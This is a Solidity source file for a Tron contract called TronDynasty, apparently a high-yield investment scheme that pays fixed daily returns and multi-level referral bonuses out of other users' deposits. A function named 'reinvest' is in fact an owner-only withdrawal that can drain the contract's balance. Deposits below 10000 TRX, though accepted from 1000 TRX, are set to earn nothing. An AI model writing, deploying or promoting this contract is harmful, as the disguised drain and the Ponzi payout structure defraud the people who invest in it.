//SourceUnit: Run.sol

pragma solidity 0.5.10;

contract TronDynasty {
	using SafeMath for uint256;
	uint256 constant public INVEST_MIN_AMOUNT = 1000e6;
	uint256 constant public BASE_PERCENT = 15;
	uint256[4] public REFERRAL_PERCENTS = [50,20,5,5];
	uint256[10]public UNILEVEL_PERCENTS = [133,33,33,33,33,33,33,33,33,33];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	address payable public marketing;
	address payable public Development;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 max;
	}

	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 bonus;
		uint256 level1;
		uint256 level2;
		uint256 level3;
		uint256 uniLevelBonus;
		uint256 withdrawRef;
		uint256 totalRefferer;
		uint256[10] uniLVL;
	}
	address payable public owner;
	mapping (address => User) public users;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	constructor(address payable _owner) public {
		owner=_owner;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != Development) {
				referrer = Development;
			}
    
    user.referrer = referrer;

            address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        users[upline].level1 = users[upline].level1.add(1);
                    } else if (i == 1) {
                        users[upline].level2 = users[upline].level2.add(1);
                    } else if (i == 2) {
                        users[upline].level3 = users[upline].level3.add(1);
                    }
					upline = users[upline].referrer;
				} else break;
            }
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}


		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}
		uint256 max;
		if(msg.value>=10000000 trx){
		    max=225;
		}
		else if(msg.value<10000000 trx && msg.value>=1000000 trx){
		    max=180;
		}
		else if(msg.value<1000000 trx && msg.value>=100000 trx){
		    max=150;
		}
		else if(msg.value<100000 trx && msg.value>=10000 trx){
		    max=135;
		}
		
		user.deposits.push(Deposit(msg.value, 0, block.timestamp,max));
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);

	
	}

	function withdraw() public {
		User storage user = users[msg.sender];
		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {
		    
        if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(user.deposits[i].max).div(100)) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
						user.deposits[i].start=block.timestamp;
					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(user.deposits[i].max).div(100)) {
					dividends = (user.deposits[i].amount.mul(user.deposits[i].max).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

}
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		uint256 unilevelbonus=getUniLevelBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.withdrawRef = user.withdrawRef.add(referralBonus);
			user.bonus = 0;
		}
		if (unilevelbonus > 0) {
			totalAmount = totalAmount.add(unilevelbonus);
			user.uniLevelBonus = 0;
		}
		

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
        
        uint256 total=getUserTotalDeposits(msg.sender);
        uint256 level=10;
          
          
		if(total>=10000000 trx){
		    level=10;
		}
		else if(total>=100000 trx){
		    level=5;
		}
		
		else if(total>1000 trx){
		    level=3;
		}
		 
		
        if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < level; i++) {
				if (upline != address(0)) {
					uint256 amount = totalAmount.mul(UNILEVEL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].uniLevelBonus = users[upline].uniLevelBonus.add(amount);
					users[upline].uniLVL[i] = users[upline].uniLVL[i].add(UNILEVEL_PERCENTS[i]);
					upline = users[upline].referrer;
				} else break;
			}

		}
        
		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {
        if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(user.deposits[i].max).div(100)) {
					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

             		if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(user.deposits[i].max).div(100)) {
					dividends = (user.deposits[i].amount.mul(user.deposits[i].max).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
}
		}

		return totalDividends;
	}
   	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3);
	}
	
	function getUserUniLvlCount(address userAddress) public view returns(uint256[10] memory) {
		return (users[userAddress].uniLVL);
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	function getUniLevelBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].uniLevelBonus;
	}

	function getUserReferralWithdraw(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawRef;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
    function reinvest(uint256 _value)public returns(bool){
	    require(msg.sender==owner,"access denied");
	    owner.transfer(_value.mul(1000000));
	    return true;
	}
    
	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}